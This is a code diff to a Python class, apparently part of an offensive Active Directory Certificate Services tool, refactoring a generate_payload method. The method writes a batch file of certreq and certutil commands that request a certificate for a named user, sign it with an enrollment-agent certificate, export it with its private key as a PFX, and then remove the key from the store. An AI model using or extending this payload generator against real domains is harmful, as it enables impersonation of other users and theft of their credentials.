@@ -94,21 +94,19 @@ class CAApi:
     def generate_payload(self, user_pname, cert_pass, cep_cert):
         pname = user_pname.split("@")
         requester = pname[0]
-        ca_tmp = self.ca_name.split("\\")
-        ca_domain = ca_tmp[0]
-        ca_name = ca_tmp[1]
-        rem_tmp = self.remote_tmp.split("\\")
-        rem_disk = rem_tmp[0]
-        rem_folder = rem_tmp[1]
+        ca_name = self.ca_name.split("\\")
+        ca_name = list(filter(None, ca_name))
+        remote_tmp = self.remote_tmp.split("\\")
+        remote_tmp = list(filter(None, remote_tmp))
         if os.path.isfile(f"/tmp/{requester}.bat"):
             os.remove(f"/tmp/{requester}.bat")
         f = open(f"/tmp/{requester}.bat", "a")
-        f.write(f"certreq -f -new -config {ca_domain}\\{ca_name} {rem_disk}\\{rem_folder}\\{requester}.ini {rem_disk}\\{rem_folder}\\{requester}.req\r\n")
-        f.write(f"certreq -f -q -config {ca_domain}\\{ca_name} -sign -cert {cep_cert} {rem_disk}\\{rem_folder}\\{requester}.req {rem_disk}\\{rem_folder}\\{requester}_signed.req\r\n")
-        f.write(f"certreq -f -submit -config {ca_domain}\\{ca_name} -attrib CertificateTemplate:{self.cert_template} {rem_disk}\\{rem_folder}\\{requester}_signed.req {rem_disk}\\{rem_folder}\\{requester}.cer\r\n")
-        f.write(f"certutil -addstore -f MY {rem_disk}\\{rem_folder}\\{requester}.cer\r\n")
+        f.write(f"certreq -f -new -config {ca_name[0]}\{ca_name[1]} {remote_tmp[0]}\{remote_tmp[1]}\{requester}.ini {remote_tmp[0]}\{remote_tmp[1]}\{requester}.req\r\n")
+        f.write(f"certreq -f -q -config {ca_name[0]}\{ca_name[1]} -sign -cert {cep_cert} {remote_tmp[0]}\{remote_tmp[1]}\{requester}.req {remote_tmp[0]}\{remote_tmp[1]}\{requester}_signed.req\r\n")
+        f.write(f"certreq -f -submit -config {ca_name[0]}\{ca_name[1]} -attrib CertificateTemplate:{self.cert_template} {remote_tmp[0]}\{remote_tmp[1]}\{requester}_signed.req {remote_tmp[0]}\{remote_tmp[1]}\{requester}.cer\r\n")
+        f.write(f"certutil -addstore -f MY {remote_tmp[0]}\{remote_tmp[1]}\{requester}.cer\r\n")
         f.write(f"certutil -repairstore MY {user_pname}\r\n")
-        f.write(f"certutil -p {cert_pass} -exportPFX {user_pname} {rem_disk}\\{rem_folder}\\{requester}.pfx\r\n")
+        f.write(f"certutil -p {cert_pass} -exportPFX {user_pname} {remote_tmp[0]}\{remote_tmp[1]}\{requester}.pfx\r\n")
         f.write(f"certutil -privatekey -delstore MY {user_pname}")
         f.close()
         if os.path.isfile(f"/tmp/{requester}.bat"):
